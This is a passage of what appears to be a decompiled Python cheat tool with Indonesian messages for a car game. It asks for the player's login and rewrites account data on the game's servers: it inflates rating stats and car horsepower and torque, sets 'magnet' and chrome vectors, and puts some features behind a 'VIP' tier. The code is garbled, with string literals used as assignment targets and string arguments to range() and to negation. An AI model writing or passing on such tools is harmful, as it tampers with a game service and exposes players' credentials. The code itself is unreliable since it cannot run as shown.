                            contoh = {'t_distance': '10000', 'time': '30000', 'speed_banner': '1000', 'gifts': '100', 'treasure': '100', 'cars': '137', 'race_win': '1000', 'levels': '82', 'drift': '1000', 'run': '500', 'police': '1000', 'block_post': '1000', 'real_estate': '12', 'fuel': '10000', 'car_trade': '100', 'car_exchange': '100', 'burnt_tire': '100', 'car_fix': '100', 'car_wash': '100', 'offroad': '1000', 'passanger_distance': '1000', 'reactions': '2000', 'drift_max': '1000', 'taxi': '1000', 'delivery': '1000', 'cargo': '1000', 'push_ups': '957', 'slicer_cut': '1', 'car_collided': '1', 'new_type': '0'}
                            isidata = {'RatingData': contoh}
                            if SetUserRatingCall(isidata) == True:
                                print(f"{warna('[00ff00]', 'Success')}")
                            else:
                                print(f"{warna('[ff0000]', 'Failed')}")
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
                    elif pil.lower() == 'csc':
                        try:
                            '\tScript ini membutuhkan data login akun anda\n    \tuntuk dapat mengedit value pada akun anda\n    \tjika anda tidak setuju maka tinggalkan script ini\n    ' = TestGetAllCars()
                            for idcar in dat['datacar']:
                                print(warna('[00FFFF]', '------------------------'))
                                spek = []
                                for dataspek in range('1', '5'):
                                    if dat['datacar'][idpil]['data']['floats'][dataspek] != '0':
                                        spek.append(dat['datacar'][idpil]['data']['floats'][dataspek])
                                    else:
                                        spek.append('Default')
                                urutancar = str(cariurutan(str(idcar)))
                                print(f"Car Number : {warna('[00FFFF]', urutancar)} {warna('[ff00ae]', namacar[urutancar])}")
                                print(f"\tHP : {warna('[00FF00]', str(spek[0]))}({warna('[C3FF00]', str(spek[1]))})")
                                print(f"\tNM : {warna('[00FF00]', str(spek[2]))}({warna('[C3FF00]', str(spek[3]))})")
                            print(warna('[00FFFF]', '------------------------'))
                            idpil = input('Choose Car Number : ')
                            try:
                                idcar = cariid(int(idpil))
                                idpil = int(idcar)
                                if idpil in dat['datacar']:
                                    print(f"\tHP : {warna('[00FF00]', str(dat['datacar'][idpil]['data']['floats'][1]))}({warna('[C3FF00]', str(dat['datacar'][idpil]['data']['floats'][2]))})")
                                    print(f"\tNM : {warna('[00FF00]', str(dat['datacar'][idpil]['data']['floats'][3]))}({warna('[C3FF00]', str(dat['datacar'][idpil]['data']['floats'][4]))})")
                                    print(warna('[C533FF]', 'New Spec:'))
                                    hp = input('HP       : ')
                                    ihp = input('Inner HP : ')
                                    nm = input('NM       : ')
                                    inm = input('Inner NM : ')
                                    print()
                                    print(f"  HP {warna('[00FF00]', hp)}({warna('[C3FF00]', ihp)})")
                                    print(f"  NM {warna('[00FF00]', nm)}({warna('[C3FF00]', inm)})")
                                    dat['datacar'][idpil]['data']['floats']['0'] = '1'
                                    dat['datacar'][idpil]['data']['floats']['1'] = hp
                                    dat['datacar'][idpil]['data']['floats']['2'] = ihp
                                    dat['datacar'][idpil]['data']['floats']['3'] = nm
                                    dat['datacar'][idpil]['data']['floats']['4'] = inm
                                    if SaveCars(dat['datacar'][idpil]) == True:
                                        print(f"{warna('[00ff00]', 'Success')}")
                                    else:
                                        print(f"{warna('[ff0000]', 'Failed')}")
                                else:
                                    print(f'Anda tidak memiliki mobil dengan urutan {idpil}')
                            except:
                                print('please type Number Of CAR')
                        except Exception as e:
                            print(f'Error : {e}')
                    elif pil.lower() == 'mc':
                        if dat['grant'] == 'Vip':
                            '\tScript ini membutuhkan data login akun anda\n    \tuntuk dapat mengedit value pada akun anda\n    \tjika anda tidak setuju maka tinggalkan script ini\n    ' = TestGetAllCars()
                            for idcar in dat['datacar']:
                                print(warna('[00FFFF]', '------------------------'))
                                spek = []
                                for dataspek in range('1', '5'):
                                    if dat['datacar'][idpil]['data']['floats'][dataspek] != '0':
                                        spek.append(dat['datacar'][idpil]['data']['floats'][dataspek])
                                    else:
                                        spek.append('Default')
                                urutancar = str(cariurutan(str(idcar)))
                                print(f"Car Number : {warna('[00FFFF]', urutancar)} {warna('[ff00ae]', namacar[urutancar])}")
                                print(f"\tHP : {warna('[00FF00]', str(spek[0]))}({warna('[C3FF00]', str(spek[1]))})")
                                print(f"\tNM : {warna('[00FF00]', str(spek[2]))}({warna('[C3FF00]', str(spek[3]))})")
                            print(warna('[00FFFF]', '------------------------'))
                            idpil = input('Pilih Mobil untuk dijadikan magnet: ')
                            try:
                                idcar = cariid(int(idpil))
                                idpil = int(idcar)
                                if idpil in dat['datacar']:
                                    print(f"\tHP : {warna('[00FF00]', str(dat['datacar'][idpil]['data']['floats'][1]))}({warna('[C3FF00]', str(dat['datacar'][idpil]['data']['floats'][2]))})")
                                    print(f"\tNM : {warna('[00FF00]', str(dat['datacar'][idpil]['data']['floats'][3]))}({warna('[C3FF00]', str(dat['datacar'][idpil]['data']['floats'][4]))})")
                                    dat['datacar'][idpil]['data']['vectors']['6']['x'] = float('9898989898')
                                    if SaveCars(dat['datacar'][idpil]) == True:
                                        print(f"{warna('[00ff00]', 'Success')}")
                                    else:
                                        print(f"{warna('[ff0000]', 'Failed')}")
                                else:
                                    print(f'Anda tidak memiliki mobil dengan urutan {idpil}')
                            except:
                                print('please type Number Of CAR')
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
                    elif pil.lower() == 'rmc':
                        if dat['grant'] == 'Vip':
                            '\tScript ini membutuhkan data login akun anda\n    \tuntuk dapat mengedit value pada akun anda\n    \tjika anda tidak setuju maka tinggalkan script ini\n    ' = TestGetAllCars()
                            for idcar in dat['datacar']:
                                print(warna('[00FFFF]', '------------------------'))
                                spek = []
                                for dataspek in range('1', '5'):
                                    if dat['datacar'][idpil]['data']['floats'][dataspek] != '0':
                                        spek.append(dat['datacar'][idpil]['data']['floats'][dataspek])
                                    else:
                                        spek.append('Default')
                                print(f"Car Number : {warna('[00FFFF]', str(cariurutan(str(idcar))))}")
                                print(f"\tHP : {warna('[00FF00]', str(spek[0]))}({warna('[C3FF00]', str(spek[1]))})")
                                print(f"\tNM : {warna('[00FF00]', str(spek[2]))}({warna('[C3FF00]', str(spek[3]))})")
                            print(warna('[00FFFF]', '------------------------'))
                            idpil = input('Pilih Mobil untuk dijadikan magnet: ')
                            try:
                                idcar = cariid(int(idpil))
                                idpil = int(idcar)
                                if idpil in dat['datacar']:
                                    print(f"\tHP : {warna('[00FF00]', str(dat['datacar'][idpil]['data']['floats'][1]))}({warna('[C3FF00]', str(dat['datacar'][idpil]['data']['floats'][2]))})")
                                    print(f"\tNM : {warna('[00FF00]', str(dat['datacar'][idpil]['data']['floats'][3]))}({warna('[C3FF00]', str(dat['datacar'][idpil]['data']['floats'][4]))})")
                                    dat['datacar'][idpil]['data']['vectors']['6'] = {'x': '2', 'y': '2', 'z': '2'}
                                    if SaveCars(dat['datacar'][idpil]) == True:
                                        print(f"{warna('[00ff00]', 'Success')}")
                                    else:
                                        print(f"{warna('[ff0000]', 'Failed')}")
                                else:
                                    print(f'Anda tidak memiliki mobil dengan urutan {idpil}')
                            except:
                                print('please type Number Of CAR')
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
                    elif pil.lower() == 'csac':
                        if dat['grant'] == 'Vip':
                            '\tScript ini membutuhkan data login akun anda\n    \tuntuk dapat mengedit value pada akun anda\n    \tjika anda tidak setuju maka tinggalkan script ini\n    ' = TestGetAllCars()
                            hp = input('HP       : ')
                            ihp = input('Inner HP : ')
                            nm = input('NM       : ')
                            inm = input('Inner NM : ')
                            print(warna('[00FFFF]', '------------------------'))
                            for idpil in dat['datacar']:
                                print(warna('[00FFFF]', '------------------------'))
                                spek = []
                                for dataspek in range('1', '5'):
                                    if dat['datacar'][idpil]['data']['floats'][dataspek] != '0':
                                        spek.append(dat['datacar'][idpil]['data']['floats'][dataspek])
                                    else:
                                        spek.append('Default')
                                urutancar = str(cariurutan(str(idpil)))
                                print(f"Car Number : {warna('[00FFFF]', urutancar)} {warna('[ff00ae]', namacar[urutancar])}")
                                print(f"\tHP : {warna('[00FF00]', str(spek[0]))}({warna('[C3FF00]', str(spek[1]))})")
                                print(f"\tNM : {warna('[00FF00]', str(spek[2]))}({warna('[C3FF00]', str(spek[3]))})")
                                print(warna('[C533FF]', f'  New Spec {idpil}:'))
                                print(f"\tHP {warna('[00FF00]', hp)}({warna('[C3FF00]', ihp)})")
                                print(f"\tNM {warna('[00FF00]', nm)}({warna('[C3FF00]', inm)})")
                                dat['datacar'][idpil]['data']['floats']['1'] = hp
                                dat['datacar'][idpil]['data']['floats']['2'] = ihp
                                dat['datacar'][idpil]['data']['floats']['3'] = nm
                                dat['datacar'][idpil]['data']['floats']['4'] = inm
                                dat['datacar'][idpil]['data']['floats']['7'] = '3.0'
                                dat['datacar'][idpil]['data']['floats']['16'] = '1e-24'
                                if SaveCars(dat['datacar'][idpil]) == True:
                                    print(f"{warna('[00ff00]', 'Success')}")
                                else:
                                    print(f"{warna('[ff0000]', 'Failed')}")
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
                    elif pil.lower() == 'ccac':
                        if dat['grant'] == 'Vip':
                            pil = input('1. Chrome ON\n2. Chrome OFF\npilihan : ')
                            '\tScript ini membutuhkan data login akun anda\n    \tuntuk dapat mengedit value pada akun anda\n    \tjika anda tidak setuju maka tinggalkan script ini\n    ' = TestGetAllCars()
                            print(warna('[00FFFF]', '------------------------'))
                            for idpil in dat['datacar']:
                                try:
                                    print(warna('[00FFFF]', '------------------------'))
                                    spek = []
                                    for dataspek in range('1', '5'):
                                        if dat['datacar'][idpil]['data']['floats'][dataspek] != '0':
                                            spek.append(dat['datacar'][idpil]['data']['floats'][dataspek])
                                        else:
                                            spek.append('Default')
                                    urutancar = str(cariurutan(str(idpil)))
                                    print(f"Car Number : {warna('[00FFFF]', urutancar)} {warna('[ff00ae]', namacar[urutancar])}")
                                    print(f"\tHP : {warna('[00FF00]', str(spek[0]))}({warna('[C3FF00]', str(spek[1]))})")
                                    print(f"\tNM : {warna('[00FF00]', str(spek[2]))}({warna('[C3FF00]', str(spek[3]))})")
                                    if pil == '1':
                                        dat['datacar'][idpil]['data']['vectors']['12'] = {'x': -'4', 'y': -'4', 'z': -'4'}
                                    elif pil == '2':
                                        dat['datacar'][idpil]['data']['vectors']['12'] = {'x': '2', 'y': '2', 'z': '2'}
                                    if SaveCars(dat['datacar'][idpil]) == True:
                                        print(f"{warna('[00ff00]', 'Success')}")
                                    else:
                                        print(f"{warna('[ff0000]', 'Failed')}")
                                except Exception as e:
                                    print(warna('[FF0000]', f'Failed : {e}'))
                        else:
                            print(warna('[FF0000]', 'Regist your Email into VIP First'))
    except Exception as e:
        print(warna('[FF0000]', str(e)))
except Exception as e:
    print(f'Error : {e}')
